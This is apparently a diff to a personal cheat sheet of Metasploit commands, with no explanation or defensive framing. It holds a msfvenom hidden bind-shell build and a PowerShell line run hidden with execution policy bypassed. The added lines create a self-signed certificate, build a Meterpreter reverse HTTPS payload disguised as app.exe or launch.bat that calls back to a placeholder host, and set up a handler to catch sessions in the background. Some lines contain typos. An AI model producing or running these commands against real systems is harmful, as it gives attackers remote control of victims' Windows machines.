@@ -34,3 +34,34 @@ msfvenom -p windows/shell_hidden_bind_tcp LPORT=8889 AHOST=192.168.52.129 -f exe
 use exploit/mulit/handler
 set payload windows///
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden —File "C:\do_neat_ps_shit.ps1"
+
+
+
+
+
+
+
+
+
+
+
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
+    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
+    -keyout www.example.com.key \
+    -out www.example.com.crt && \
+cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
+rm -f www.example.com.key  www.example.com.crt
+
+
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=app -f exe -o ./app.exe(-f psh-cmd -o launch.bat)
+
+msfconsole -r
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_winhttps
+set LHOST www.example.com
+set LPORT 443
+set HandlerSSLCert ./www.example.com.pem
+set IgnoreUnknownPayloads true
+set StagerVerifySSLCert true
+set exitonsession false
+run -j -z
